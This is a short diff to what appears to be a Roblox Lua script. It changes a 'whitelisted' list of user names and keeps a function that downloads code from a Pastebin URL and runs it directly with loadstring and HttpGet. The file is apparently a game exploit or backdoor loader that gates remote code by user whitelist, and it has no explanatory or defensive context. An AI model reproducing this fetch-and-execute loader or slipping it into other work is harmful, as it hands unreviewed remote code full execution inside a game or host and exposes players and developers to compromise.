@@ -1,5 +1,4 @@
-local whitelisted =  ("KXOxgfjqy8"), ("NinjaZineWs"), ("16tery_na16"), ("3"), ("3")
-
+local whitelisted =  ("NinjaZineWs"), ("2"), ("16tery_na16"), ("3"), ("3")
 function script()
 loadstring(game:HttpGet("https://pastebin.com/raw/T10AxqTS"))()
 end
